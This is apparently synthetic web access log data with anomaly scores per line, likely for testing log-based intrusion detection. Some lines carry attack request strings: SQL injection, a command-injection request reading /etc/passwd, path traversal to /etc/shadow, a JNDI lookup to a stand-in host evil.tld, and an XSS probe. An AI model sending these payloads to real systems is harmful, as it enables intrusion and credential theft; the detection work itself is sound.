score_content,score_session,score_fused,score_fused_norm,line
70.0821762084961,,70.0821762084961,70.0821762084961,206.250.187.176 - - [10/Jan/2025:12:00:00 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 18298 "-" "curl/7.85.0"
24.404993057250977,,24.404993057250977,24.404993057250977,123.51.186.156 - - [10/Jan/2025:12:00:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 10161 "-" "Wget/1.21.2 (linux-gnu)"
95.83993530273438,,95.83993530273438,95.83993530273438,169.123.26.189 - - [10/Jan/2025:12:00:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 10330 "https://example.com/" "nikto/2.5.0"
98.6030044555664,,98.6030044555664,98.6030044555664,45.212.159.159 - - [10/Jan/2025:12:00:04 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 3204 "-" "python-requests/2.31.0"
1.9596283435821533,,1.9596283435821533,1.9596283435821533,40.173.159.248 - - [10/Jan/2025:12:00:05 +0100] "GET /contact HTTP/1.1" 200 1046 "-" "curl/7.85.0"
24.46363067626953,,24.46363067626953,24.46363067626953,169.174.40.120 - - [10/Jan/2025:12:00:06 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 17291 "https://example.com/" "python-requests/2.31.0"
127.05689239501953,,127.05689239501953,127.05689239501953,53.172.215.182 - - [10/Jan/2025:12:00:08 +0100] "TRACE /search?q=headphones HTTP/1.1" 204 5218 "-" "python-requests/2.31.0"
53.06451416015625,,53.06451416015625,53.06451416015625,113.254.115.241 - - [10/Jan/2025:12:00:09 +0100] "DELETE /api/product?id=123 HTTP/1.1" 304 17167 "https://example.com/" "dirb/2.22"
95.74685668945312,,95.74685668945312,95.74685668945312,51.35.94.36 - - [10/Jan/2025:12:00:10 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 6381 "https://example.com/" "python-requests/2.31.0"
0.19477443397045135,,0.19477443397045135,0.19477443397045135,4.188.252.184 - - [10/Jan/2025:12:00:13 +0100] "GET /assets/app.css HTTP/1.1" 204 2197 "-" "sqlmap/1.7.2#stable"
35.75467300415039,,35.75467300415039,35.75467300415039,52.195.121.210 - - [10/Jan/2025:12:00:14 +0100] "PUT /search?q=headphones HTTP/1.1" 200 12702 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.67709732055664,,47.67709732055664,47.67709732055664,46.247.192.214 - - [10/Jan/2025:12:00:15 +0100] "HEAD /profile HTTP/1.1" 200 13830 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.69490051269531,,95.69490051269531,95.69490051269531,134.135.242.146 - - [10/Jan/2025:12:00:18 +0100] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6158 "-" "sqlmap/1.7.2#stable"
27.332658767700195,,27.332658767700195,27.332658767700195,145.18.128.181 - - [10/Jan/2025:12:00:18 +0100] "POST /search?q=ssd HTTP/1.1" 200 10108 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
35.82241439819336,,35.82241439819336,35.82241439819336,249.44.188.226 - - [10/Jan/2025:12:00:20 +0100] "PUT /search?q=monitor HTTP/1.1" 200 16445 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
127.19060516357422,,127.19060516357422,127.19060516357422,245.76.94.181 - - [10/Jan/2025:12:00:20 +0100] "TRACE /search?q=laptop HTTP/1.1" 200 17527 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.389698028564453,,24.389698028564453,24.389698028564453,126.206.123.64 - - [10/Jan/2025:12:00:22 +0100] "GET /search?q=phone HTTP/1.1" 200 2185 "https://twitter.com/" "dirb/2.22"
1.9858101606369019,,1.9858101606369019,1.9858101606369019,126.99.228.236 - - [10/Jan/2025:12:00:22 +0100] "GET /contact HTTP/1.1" 200 7604 "https://www.google.com/" "python-requests/2.31.0"
50.14132308959961,,50.14132308959961,50.14132308959961,177.172.68.127 - - [10/Jan/2025:12:00:22 +0100] "DELETE /search?q=phone HTTP/1.1" 200 17093 "https://example.com/" "sqlmap/1.7.2#stable"
27.68310546875,,27.68310546875,27.68310546875,170.160.60.153 - - [10/Jan/2025:12:00:24 +0100] "DELETE /profile HTTP/1.1" 200 10607 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
95.75989532470703,,95.75989532470703,95.75989532470703,131.167.149.134 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4633 "-" "nikto/2.5.0"
95.8763427734375,,95.8763427734375,95.8763427734375,199.52.180.132 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17002 "https://www.google.com/" "dirb/2.22"
4.844927787780762,,4.844927787780762,4.844927787780762,162.105.144.160 - - [10/Jan/2025:12:00:30 +0100] "POST /contact HTTP/1.1" 200 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30170.60546875,,30170.60546875,30170.60546875,217.67.130.155 - - [10/Jan/2025:12:00:31 +0100] "HEAD /wp-login.php HTTP/1.1" 404 1014 "https://twitter.com/" "curl/7.85.0"
47.618003845214844,,47.618003845214844,47.618003845214844,252.78.96.233 - - [10/Jan/2025:12:00:34 +0100] "HEAD /api/products HTTP/1.1" 200 16081 "-" "nikto/2.5.0"
11132.7607421875,,11132.7607421875,11132.7607421875,238.70.163.254 - - [10/Jan/2025:12:00:36 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 500 1393 "-" "Wget/1.21.2 (linux-gnu)"
27.629091262817383,,27.629091262817383,27.629091262817383,220.126.109.32 - - [10/Jan/2025:12:00:39 +0100] "DELETE /dashboard HTTP/1.1" 200 14323 "https://twitter.com/" "nikto/2.5.0"
0.22522687911987305,,0.22522687911987305,0.22522687911987305,246.167.129.117 - - [10/Jan/2025:12:00:40 +0100] "GET /assets/app.js HTTP/1.1" 200 1462 "-" "dirb/2.22"
2.2488670349121094,,2.2488670349121094,2.2488670349121094,224.27.253.99 - - [10/Jan/2025:12:00:41 +0100] "GET / HTTP/1.1" 201 2289 "https://example.com/" "python-requests/2.31.0"
0.24805684387683868,,0.24805684387683868,0.24805684387683868,178.137.182.246 - - [10/Jan/2025:12:00:44 +0100] "GET /assets/app.css HTTP/1.1" 201 12678 "https://example.com/" "dirb/2.22"
104.77961730957031,,104.77961730957031,104.77961730957031,5.95.156.185 - - [10/Jan/2025:12:00:45 +0100] "TRACE /profile HTTP/1.1" 200 17800 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.22852687537670135,,0.22852687537670135,0.22852687537670135,112.8.136.138 - - [10/Jan/2025:12:00:48 +0100] "GET /assets/app.css HTTP/1.1" 200 7605 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.966696739196777,,11.966696739196777,11.966696739196777,187.223.239.160 - - [10/Jan/2025:12:00:50 +0100] "PUT /.env HTTP/1.1" 200 8029 "-" "curl/7.85.0"
0.23147130012512207,,0.23147130012512207,0.23147130012512207,146.184.71.154 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 200 8233 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.670658111572266,,47.670658111572266,47.670658111572266,165.71.235.186 - - [10/Jan/2025:12:00:53 +0100] "HEAD /logout HTTP/1.1" 200 4266 "https://twitter.com/" "dirb/2.22"
0.3266834020614624,,0.3266834020614624,0.3266834020614624,48.161.115.11 - - [10/Jan/2025:12:00:55 +0100] "GET /index.html HTTP/1.1" 201 5713 "https://www.google.com/" "sqlmap/1.7.2#stable"
11064.5068359375,,11064.5068359375,11064.5068359375,9.31.40.20 - - [10/Jan/2025:12:00:57 +0100] "POST /search?q=ssd HTTP/1.1" 502 1197 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.402679443359375,,13.402679443359375,13.402679443359375,71.217.138.183 - - [10/Jan/2025:12:01:00 +0100] "PUT /contact HTTP/1.1" 204 10154 "https://twitter.com/" "curl/7.85.0"
30.092491149902344,,30.092491149902344,30.092491149902344,49.239.41.150 - - [10/Jan/2025:12:01:01 +0100] "POST /search?q=camera HTTP/1.1" 302 1819 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.363024711608887,,13.363024711608887,13.363024711608887,21.13.62.46 - - [10/Jan/2025:12:01:01 +0100] "PUT /profile HTTP/1.1" 204 1813 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
73.44247436523438,,73.44247436523438,73.44247436523438,153.66.165.55 - - [10/Jan/2025:12:01:02 +0100] "OPTIONS /login HTTP/1.1" 200 178 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3578817546367645,,0.3578817546367645,0.3578817546367645,126.179.250.3 - - [10/Jan/2025:12:01:04 +0100] "GET /index.html HTTP/1.1" 200 12230 "-" "dirb/2.22"
13.429558753967285,,13.429558753967285,13.429558753967285,3.4.8.84 - - [10/Jan/2025:12:01:06 +0100] "PUT /contact HTTP/1.1" 200 15472 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.202512741088867,,27.202512741088867,27.202512741088867,42.88.226.120 - - [10/Jan/2025:12:01:06 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 302 4925 "-" "dirb/2.22"
35.82619857788086,,35.82619857788086,35.82619857788086,200.208.161.226 - - [10/Jan/2025:12:01:06 +0100] "PUT /search?q=camera HTTP/1.1" 200 11564 "https://example.com/" "nikto/2.5.0"
104.7737808227539,,104.7737808227539,104.7737808227539,7.196.154.167 - - [10/Jan/2025:12:01:07 +0100] "TRACE /profile HTTP/1.1" 200 16003 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.114686965942383,,27.114686965942383,27.114686965942383,171.254.229.127 - - [10/Jan/2025:12:01:08 +0100] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 7838 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.9609360694885254,,1.9609360694885254,1.9609360694885254,204.110.181.232 - - [10/Jan/2025:12:01:11 +0100] "GET /contact HTTP/1.1" 200 2741 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11037.3837890625,,11037.3837890625,11037.3837890625,91.16.226.182 - - [10/Jan/2025:12:01:12 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 500 49 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.635154724121094,,50.635154724121094,50.635154724121094,213.100.220.83 - - [10/Jan/2025:12:01:15 +0100] "HEAD /logout HTTP/1.1" 304 16208 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.907247543334961,,1.907247543334961,1.907247543334961,50.30.147.156 - - [10/Jan/2025:12:01:15 +0100] "GET /api/products HTTP/1.1" 200 5263 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.21599578857422,,127.21599578857422,127.21599578857422,87.61.105.167 - - [10/Jan/2025:12:01:17 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 15507 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.806640625,,30124.806640625,30124.806640625,153.202.96.213 - - [10/Jan/2025:12:01:19 +0100] "GET /assets/app.css HTTP/1.1" 403 1231 "https://www.google.com/" "sqlmap/1.7.2#stable"
45.94643783569336,,45.94643783569336,45.94643783569336,88.86.190.128 - - [10/Jan/2025:12:01:20 +0100] "HEAD /wp-login.php HTTP/1.1" 200 8748 "https://example.com/" "dirb/2.22"
47.64936828613281,,47.64936828613281,47.64936828613281,76.197.208.107 - - [10/Jan/2025:12:01:21 +0100] "HEAD /profile HTTP/1.1" 200 7236 "https://example.com/" "nikto/2.5.0"
127.13919067382812,,127.13919067382812,127.13919067382812,172.148.72.13 - - [10/Jan/2025:12:01:21 +0100] "TRACE /search?q=monitor HTTP/1.1" 200 9527 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.25591278076172,,27.25591278076172,27.25591278076172,146.46.48.194 - - [10/Jan/2025:12:01:21 +0100] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5022 "https://twitter.com/" "nikto/2.5.0"
11107.1572265625,,11107.1572265625,11107.1572265625,74.38.213.231 - - [10/Jan/2025:12:01:24 +0100] "HEAD /search?q=phone HTTP/1.1" 500 205 "https://twitter.com/" "nikto/2.5.0"
70.03693389892578,,70.03693389892578,70.03693389892578,126.229.29.71 - - [10/Jan/2025:12:01:25 +0100] "HEAD /search?q=camera HTTP/1.1" 200 2767 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.08591079711914,,50.08591079711914,50.08591079711914,181.131.194.238 - - [10/Jan/2025:12:01:25 +0100] "DELETE /search?q=camera HTTP/1.1" 200 8698 "-" "dirb/2.22"
24.337312698364258,,24.337312698364258,24.337312698364258,46.186.171.53 - - [10/Jan/2025:12:01:25 +0100] "GET /search?q=headphones HTTP/1.1" 200 12219 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
70.0123062133789,,70.0123062133789,70.0123062133789,51.142.138.83 - - [10/Jan/2025:12:01:27 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 1209 "https://news.ycombinator.com/" "dirb/2.22"
4.8753581047058105,,4.8753581047058105,4.8753581047058105,222.80.69.129 - - [10/Jan/2025:12:01:28 +0100] "POST /profile HTTP/1.1" 200 17655 "https://twitter.com/" "python-requests/2.31.0"
24.506664276123047,,24.506664276123047,24.506664276123047,187.157.126.147 - - [10/Jan/2025:12:01:28 +0100] "GET /search?q=ssd HTTP/1.1" 204 19786 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.14992904663086,,50.14992904663086,50.14992904663086,106.81.52.56 - - [10/Jan/2025:12:01:29 +0100] "DELETE /search?q=phone HTTP/1.1" 200 19860 "-" "python-requests/2.31.0"
95.72911834716797,,95.72911834716797,95.72911834716797,250.162.76.86 - - [10/Jan/2025:12:01:32 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 3060 "https://twitter.com/" "curl/7.85.0"
4.867952823638916,,4.867952823638916,4.867952823638916,115.4.231.188 - - [10/Jan/2025:12:01:33 +0100] "POST /contact HTTP/1.1" 200 15398 "https://example.com/" "nikto/2.5.0"
47.72270202636719,,47.72270202636719,47.72270202636719,14.15.134.242 - - [10/Jan/2025:12:01:34 +0100] "HEAD /login HTTP/1.1" 200 6886 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.27480360865592957,,0.27480360865592957,0.27480360865592957,250.86.17.201 - - [10/Jan/2025:12:01:35 +0100] "GET /assets/app.js HTTP/1.1" 200 12650 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.455656051635742,,27.455656051635742,27.455656051635742,33.170.36.252 - - [10/Jan/2025:12:01:36 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 301 15147 "-" "dirb/2.22"
2.2824552059173584,,2.2824552059173584,2.2824552059173584,149.33.120.114 - - [10/Jan/2025:12:01:38 +0100] "GET / HTTP/1.1" 200 8641 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30198.0546875,,30198.0546875,30198.0546875,57.55.130.150 - - [10/Jan/2025:12:01:41 +0100] "OPTIONS /login HTTP/1.1" 404 995 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22672420740127563,,0.22672420740127563,0.22672420740127563,73.39.98.134 - - [10/Jan/2025:12:01:42 +0100] "GET /assets/app.js HTTP/1.1" 200 2309 "https://www.google.com/" "nikto/2.5.0"
4.918524742126465,,4.918524742126465,4.918524742126465,22.143.87.90 - - [10/Jan/2025:12:01:42 +0100] "GET /logout HTTP/1.1" 301 17410 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
